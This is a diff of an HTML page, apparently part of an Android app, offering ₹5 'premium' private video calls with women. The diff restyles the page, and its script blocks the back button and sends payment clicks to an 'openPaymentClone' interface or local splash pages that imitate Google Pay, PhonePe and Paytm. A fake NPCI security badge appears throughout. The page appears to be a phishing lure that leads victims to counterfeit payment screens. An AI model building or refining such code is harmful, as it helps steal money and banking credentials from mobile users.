@@ -3,12 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Sexy Chat – Unlock Premium</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <meta name="theme-color" content="#e91e63">
+  <title>Sexy Chat – Premium Access</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    html, body {
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+    }
+    
+    html, body {
       width: 100%;
       height: 100%;
       overflow-x: hidden;
@@ -16,292 +21,408 @@
     }
     
     body {
-      background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
+      background: linear-gradient(135deg, #ff6b9d 0%, #ff1493 30%, #e91e63 60%, #d81b60 100%);
+      background-size: 400% 400%;
+      animation: gradientFlow 12s ease infinite;
+      font-family: 'Poppins', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      font-family: 'Poppins', sans-serif;
+      padding: 12px;
       overflow-y: auto;
       -webkit-overflow-scrolling: touch;
-    }
-    
-    .container {
-      background: #fff;
-      border-radius: 20px;
-      padding: 20px 18px;
-      width: 88%;
-      max-width: 340px;
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-      text-align: center;
       position: relative;
-      margin: 15px auto;
-      box-sizing: border-box;
     }
     
-    .premium-badge {
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(circle at 20% 30%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 80% 70%, rgba(255, 192, 203, 0.2) 0%, transparent 50%);
+      animation: lightMove 8s ease-in-out infinite alternate;
+      pointer-events: none;
+    }
+    
+    @keyframes gradientFlow {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+    
+    @keyframes lightMove {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(1.1); }
+    }
+    
+    .payment-card {
+      background: rgba(255, 255, 255, 0.98);
+      border-radius: 24px;
+      padding: 20px 16px;
+      width: 100%;
+      max-width: 320px;
+      box-shadow: 
+        0 20px 60px rgba(233, 30, 99, 0.3),
+        0 8px 24px rgba(0, 0, 0, 0.15),
+        inset 0 1px 0 rgba(255, 255, 255, 0.9);
+      position: relative;
+      animation: cardSlideIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      backdrop-filter: blur(10px);
+    }
+    
+    @keyframes cardSlideIn {
+      from {
+        opacity: 0;
+        transform: translateY(40px) scale(0.9) rotate(-2deg);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1) rotate(0deg);
+      }
+    }
+    
+    .heart-badge {
       position: absolute;
-      top: -4px;
-      right: -4px;
-      background: linear-gradient(135deg, #ffd700, #ffed4e);
-      color: #333;
-      padding: 5px 14px;
-      border-radius: 0 20px 0 16px;
-      font-size: 10px;
-      font-weight: 700;
-      text-transform: uppercase;
-    }
-    
-    .header {
-      background: linear-gradient(135deg, #28a745, #20c997);
+      top: -12px;
+      right: 16px;
+      background: linear-gradient(135deg, #ff1493, #ff69b4);
       color: #fff;
-      padding: 14px;
-      border-radius: 14px;
-      margin-bottom: 14px;
-      box-shadow: 0 6px 15px rgba(40, 167, 69, 0.3);
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      box-shadow: 0 4px 15px rgba(255, 20, 147, 0.4);
+      animation: heartBeat 2s ease-in-out infinite;
+      z-index: 10;
     }
     
-    .price {
-      font-size: clamp(28px, 8vw, 36px);
+    @keyframes heartBeat {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+    }
+    
+    .price-section {
+      text-align: center;
+      margin-bottom: 18px;
+      padding: 16px;
+      background: linear-gradient(135deg, #ff1493 0%, #e91e63 100%);
+      border-radius: 18px;
+      box-shadow: 0 8px 24px rgba(233, 30, 99, 0.35);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .price-section::before {
+      content: '💋';
+      position: absolute;
+      top: -15px;
+      left: -15px;
+      font-size: 60px;
+      opacity: 0.1;
+      animation: floatHeart 4s ease-in-out infinite;
+    }
+    
+    .price-section::after {
+      content: '💋';
+      position: absolute;
+      bottom: -15px;
+      right: -15px;
+      font-size: 60px;
+      opacity: 0.1;
+      animation: floatHeart 4s ease-in-out infinite 2s;
+    }
+    
+    @keyframes floatHeart {
+      0%, 100% { transform: translateY(0) rotate(0deg); }
+      50% { transform: translateY(-10px) rotate(15deg); }
+    }
+    
+    .price-amount {
+      font-size: clamp(32px, 9vw, 42px);
       font-weight: 800;
-      margin-bottom: 3px;
+      color: #fff;
+      margin-bottom: 4px;
+      text-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      animation: pricePulse 2s ease-in-out infinite;
+    }
+    
+    @keyframes pricePulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
     }
     
     .price-label {
-      font-size: 11px;
-      opacity: 0.9;
+      font-size: clamp(11px, 3vw, 13px);
+      color: rgba(255, 255, 255, 0.95);
       font-weight: 500;
     }
     
-    .offer-msg {
-      background: linear-gradient(135deg, #ffe6e6, #fff0f0);
-      padding: 12px;
+    .offer-banner {
+      background: linear-gradient(135deg, #fff0f5, #ffe4e1);
+      border-left: 4px solid #ff1493;
+      padding: 12px 14px;
       border-radius: 12px;
-      border-left: 3px solid #d32f2f;
-      color: #c62828;
-      font-size: 12px;
-      line-height: 1.5;
-      margin-bottom: 14px;
-    }
-    
-    .offer-msg strong {
-      font-weight: 700;
-      display: block;
-      margin-bottom: 3px;
-      font-size: 13px;
-    }
-    
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); }
-      50% { transform: translateY(-10px); }
-    }
-    
-    .features-list {
+      margin-bottom: 16px;
       text-align: left;
-      margin: 14px 0;
-      background: linear-gradient(135deg, #f8f9ff, #fff);
-      padding: 14px;
-      border-radius: 12px;
     }
     
-    .feature-item {
-      display: flex;
-      align-items: center;
+    .offer-title {
+      font-size: clamp(13px, 3.5vw, 15px);
+      font-weight: 700;
+      color: #c2185b;
+      margin-bottom: 4px;
+    }
+    
+    .offer-desc {
+      font-size: clamp(11px, 2.8vw, 12px);
+      color: #880e4f;
+      line-height: 1.4;
+    }
+    
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
       gap: 10px;
-      margin-bottom: 10px;
-      font-size: 12px;
-      color: #333;
+      margin-bottom: 18px;
     }
     
-    .feature-item:last-child {
-      margin-bottom: 0;
+    .feature-card {
+      background: linear-gradient(135deg, #fce4ec, #f8bbd0);
+      padding: 12px 10px;
+      border-radius: 14px;
+      text-align: center;
+      border: 1.5px solid rgba(255, 20, 147, 0.2);
+      transition: all 0.3s ease;
     }
     
-    .feature-icon {
-      width: 24px;
-      height: 24px;
-      background: linear-gradient(135deg, #9c27b0, #e91e63);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      flex-shrink: 0;
+    .feature-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(233, 30, 99, 0.25);
     }
     
-    .payment-section {
-      margin: 16px 0 14px;
+    .feature-emoji {
+      font-size: 24px;
+      margin-bottom: 6px;
+      display: block;
     }
     
-    .section-title {
+    .feature-text {
+      font-size: clamp(10px, 2.5vw, 11px);
       font-weight: 600;
-      font-size: 13px;
-      margin-bottom: 12px;
+      color: #880e4f;
+    }
+    
+    .payment-methods {
+      margin-bottom: 16px;
+    }
+    
+    .methods-title {
+      font-size: clamp(13px, 3.5vw, 15px);
+      font-weight: 700;
       color: #333;
+      margin-bottom: 12px;
+      text-align: center;
     }
     
-    .pay-options {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
+    .methods-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
       margin-bottom: 14px;
-      flex-wrap: wrap;
     }
     
-    .pay-option {
-      width: 55px;
-      height: 55px;
+    .method-btn {
+      aspect-ratio: 1;
       background: #fff;
-      border: 2px solid #e0e0e0;
-      border-radius: 12px;
+      border: 2.5px solid #e0e0e0;
+      border-radius: 16px;
       display: flex;
       align-items: center;
       justify-content: center;
       cursor: pointer;
-      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.05);
+      transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+      position: relative;
+      overflow: hidden;
     }
     
-    .pay-option svg {
-      width: 35px;
-      height: 35px;
+    .method-btn::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: radial-gradient(circle, rgba(255, 20, 147, 0.2) 0%, transparent 70%);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.4s, height 0.4s;
     }
     
-    .pay-btn {
-      background: linear-gradient(135deg, #9c27b0, #e91e63);
+    .method-btn:active::before {
+      width: 200%;
+      height: 200%;
+    }
+    
+    .method-btn:active {
+      transform: scale(0.92);
+    }
+    
+    .method-btn img {
+      width: 80%;
+      height: 80%;
+      object-fit: contain;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .pay-button {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #ff1493 0%, #e91e63 50%, #ff1493 100%);
+      background-size: 200% 100%;
       color: #fff;
       border: none;
-      padding: 13px;
-      border-radius: 12px;
-      font-size: 15px;
+      border-radius: 16px;
+      font-size: clamp(15px, 4vw, 17px);
       font-weight: 700;
-      width: 100%;
       cursor: pointer;
-      box-shadow: 0 8px 20px rgba(156, 39, 176, 0.4);
+      box-shadow: 0 8px 24px rgba(233, 30, 99, 0.4);
       text-transform: uppercase;
-      letter-spacing: 0.5px;
+      letter-spacing: 1px;
+      transition: all 0.3s ease;
+      animation: buttonShine 3s ease-in-out infinite;
+      position: relative;
+      overflow: hidden;
     }
     
-    .secure {
-      margin-top: 14px;
-      padding: 8px;
-      background: linear-gradient(135deg, #e8f5e9, #f1f8e9);
-      border-radius: 10px;
-      font-size: 11px;
-      color: #2e7d32;
+    .pay-button::after {
+      content: '💖';
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      animation: heartFloat 2s ease-in-out infinite;
+    }
+    
+    @keyframes buttonShine {
+      0%, 100% { 
+        background-position: 0% 50%;
+        box-shadow: 0 8px 24px rgba(233, 30, 99, 0.4);
+      }
+      50% { 
+        background-position: 100% 50%;
+        box-shadow: 0 12px 32px rgba(233, 30, 99, 0.6), 0 0 30px rgba(255, 20, 147, 0.3);
+      }
+    }
+    
+    @keyframes heartFloat {
+      0%, 100% { transform: translateY(-50%) translateX(0); }
+      50% { transform: translateY(-50%) translateX(5px); }
+    }
+    
+    .pay-button:active {
+      transform: scale(0.96);
+    }
+    
+    .security-badge {
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 6px;
+      gap: 8px;
+      margin-top: 14px;
+      padding: 10px;
+      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+      border-radius: 12px;
+      font-size: clamp(10px, 2.5vw, 11px);
+      color: #2e7d32;
       font-weight: 600;
     }
     
-    .secure svg {
-      height: 18px;
-      width: 50px;
-    }
-    
-    .timer {
-      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
-      color: #fff;
-      padding: 8px;
-      border-radius: 10px;
-      font-size: 11px;
-      font-weight: 600;
+    .warning-note {
       margin-top: 12px;
-    }
-    
-    .warning-box {
-      background: linear-gradient(135deg, #fff3cd, #ffeaa7);
-      border: 2px solid #ffc107;
-      color: #856404;
-      padding: 12px;
+      padding: 10px 12px;
+      background: linear-gradient(135deg, #fff3e0, #ffe0b2);
+      border-left: 3px solid #ff9800;
       border-radius: 10px;
-      font-size: 12px;
-      font-weight: 600;
-      margin-top: 12px;
+      font-size: clamp(10px, 2.5vw, 11px);
+      color: #e65100;
       line-height: 1.5;
       text-align: left;
     }
     
-    .warning-box strong {
+    .warning-note strong {
       display: block;
-      margin-bottom: 5px;
-      font-size: 13px;
+      margin-bottom: 4px;
+      font-size: clamp(11px, 2.8vw, 12px);
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="premium-badge">⭐ Premium</div>
+  <div class="payment-card">
+    <div class="heart-badge">💖 PREMIUM</div>
     
-    <div class="header">
-      <div class="price">₹5 Only</div>
+    <div class="price-section">
+      <div class="price-amount">₹5</div>
       <div class="price-label">One-Time Payment</div>
     </div>
     
-    <div class="offer-msg">
-      <strong>🔥 Unlock Premium! 💋</strong>
-      Pay ₹5 for private 1-on-1 video calls with hot girls! 😘
+    <div class="offer-banner">
+      <div class="offer-title">🔥 Unlock Premium Access! 💋</div>
+      <div class="offer-desc">Get private 1-on-1 video calls with beautiful girls instantly!</div>
     </div>
     
-    <div class="features-list">
-      <div class="feature-item">
-        <div class="feature-icon">💖</div>
-        <div>Unlimited video calls</div>
+    <div class="features-grid">
+      <div class="feature-card">
+        <span class="feature-emoji">💖</span>
+        <div class="feature-text">Unlimited Calls</div>
       </div>
-      <div class="feature-item">
-        <div class="feature-icon">🔒</div>
-        <div>100% Private & Secure</div>
+      <div class="feature-card">
+        <span class="feature-emoji">🔒</span>
+        <div class="feature-text">100% Private</div>
       </div>
-      <div class="feature-item">
-        <div class="feature-icon">⚡</div>
-        <div>Instant activation</div>
+      <div class="feature-card">
+        <span class="feature-emoji">⚡</span>
+        <div class="feature-text">Instant Access</div>
       </div>
-      <div class="feature-item">
-        <div class="feature-icon">🎁</div>
-        <div>Exclusive content</div>
+      <div class="feature-card">
+        <span class="feature-emoji">🎁</span>
+        <div class="feature-text">Exclusive Content</div>
       </div>
     </div>
     
-    <div class="payment-section">
-      <div class="section-title">Select Payment</div>
-      
-      <div class="pay-options">
-        <div class="pay-option" onclick="selectPaymentMethod('gpay')">
-          <!-- Google Pay Logo -->
-          <img src="google-pay-icon.png" alt="Google Pay" style="width: 100%; height: auto; object-fit: contain;">
+    <div class="payment-methods">
+      <div class="methods-title">Choose Payment Method</div>
+      <div class="methods-grid">
+        <div class="method-btn" onclick="selectPaymentMethod('gpay')">
+          <img src="google-pay-icon.png" alt="Google Pay">
         </div>
-        <div class="pay-option" onclick="selectPaymentMethod('phonepe')">
-          <!-- PhonePe Logo -->
-          <img src="phonepe-icon.png" alt="PhonePe" style="width: 100%; height: auto; object-fit: contain;">
+        <div class="method-btn" onclick="selectPaymentMethod('phonepe')">
+          <img src="phonepe-icon.png" alt="PhonePe">
         </div>
-        <div class="pay-option" onclick="selectPaymentMethod('paytm')">
-          <!-- Paytm Logo -->
-          <img src="paytm-icon.png" alt="Paytm" style="width: 100%; height: auto; object-fit: contain;">
+        <div class="method-btn" onclick="selectPaymentMethod('paytm')">
+          <img src="paytm-icon.png" alt="Paytm">
         </div>
       </div>
-      
-      <button class="pay-btn" onclick="selectPaymentMethod('gpay')">💳 Pay ₹5</button>
+      <button class="pay-button" onclick="selectPaymentMethod('gpay')">Pay ₹5</button>
     </div>
     
-    <div class="secure">
-      <span>🔐 Secure</span>
-      <!-- NPCI Logo -->
-      <svg viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
-        <rect width="100" height="30" rx="4" fill="#FF6B35"/>
-        <text x="50" y="20" font-family="Arial" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">NPCI</text>
-      </svg>
+    <div class="security-badge">
+      <span>🔐</span>
+      <span>Secure Payment by NPCI</span>
     </div>
     
-    <div class="timer">⏰ Limited Offer - Activate Now!</div>
-    
-    <div class="warning-box">
-      <strong>⚠️ IMPORTANT:</strong>
-      After payment, please DO NOT close the app or press back button. Wait for the verification process to complete (takes 3-5 seconds). Your access will be activated automatically!
+    <div class="warning-note">
+      <strong>⚠️ Important:</strong>
+      Don't close the app after payment. Wait 3-5 seconds for verification. Your access will activate automatically!
     </div>
   </div>
 
   <script>
-    // Disable back button
     history.pushState(null, null, location.href);
     window.onpopstate = function() {
       history.go(1);
@@ -309,14 +430,9 @@
     
     function selectPaymentMethod(method) {
       try {
-        console.log('💰 selectPaymentMethod called with method:', method);
-        // فراخوانی Android برای باز کردن Activity کلون
         if (typeof Android !== 'undefined' && Android.openPaymentClone) {
-          console.log('✅ Android interface available, calling openPaymentClone with:', method);
           Android.openPaymentClone(method);
         } else {
-          console.error('❌ Android interface not available');
-          // Fallback: برو به splash مربوطه
           if (method === 'gpay') {
             window.location.href = 'googlepay-splash.html';
           } else if (method === 'paytm') {
@@ -326,7 +442,7 @@
           }
         }
       } catch (e) {
-        console.error('❌ Error opening payment clone:', e);
+        console.error('Error opening payment clone:', e);
       }
     }
   </script>
